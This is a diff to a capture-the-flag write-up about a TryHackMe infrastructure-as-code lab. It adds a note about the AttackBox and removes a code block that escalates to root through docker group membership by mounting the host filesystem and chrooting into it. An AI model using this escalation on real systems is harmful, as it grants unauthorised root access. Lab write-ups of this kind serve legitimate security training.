@@ -6,7 +6,7 @@
 
 ## The Environment
 
-After SSHing into the entry host as `entry:entry`, I transferred the IaC files to my AttackBox using SCP for easier analysis:
+After SSHing into the entry host as `entry:entry`, I transferred the IaC files to my AttackBox (TryHackMe's Ubuntu-based VM) using SCP for easier analysis:
 
 
 ```bash
@@ -285,15 +285,4 @@ uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdro
 
 Ubuntu is in the `docker` group. This is essentially equivalent to root access - anyone who can run `docker` can mount the host filesystem into a container and chroot into it:
 
-```bash
-docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
-# id
-uid=0(root) gid=0(root) groups=0(root)
-# find / -name "flag4-of-4.txt" 2>/dev/null
-/root/flag4-of-4.txt
-# cat /root/flag4-of-4.txt
-```
-
 ![](images/on-premises-iac/docker_group_escape_flag4.png)
-
-
